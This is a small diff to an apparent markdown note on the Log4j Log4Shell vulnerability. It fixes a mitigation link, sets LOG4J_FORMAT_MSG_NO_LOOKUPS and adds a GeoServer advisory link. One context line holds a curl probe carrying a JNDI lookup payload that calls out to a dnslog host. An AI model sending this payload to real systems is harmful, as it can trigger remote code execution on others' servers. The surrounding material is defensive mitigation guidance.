@@ -8,7 +8,10 @@ categories: log4j java tomcat
 curl https://hostname -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
 ```
 mitigation:<br>
-(https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/)[https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/]
+[https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/](https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/)
 ```
 ENV LOG4J_FORMAT_MSG_NO_LOOKUPS=true
 ```
+
+geoserver:<br>
+[http://geoserver.org/announcements/2021/12/13/logj4-rce-statement.html](http://geoserver.org/announcements/2021/12/13/logj4-rce-statement.html)
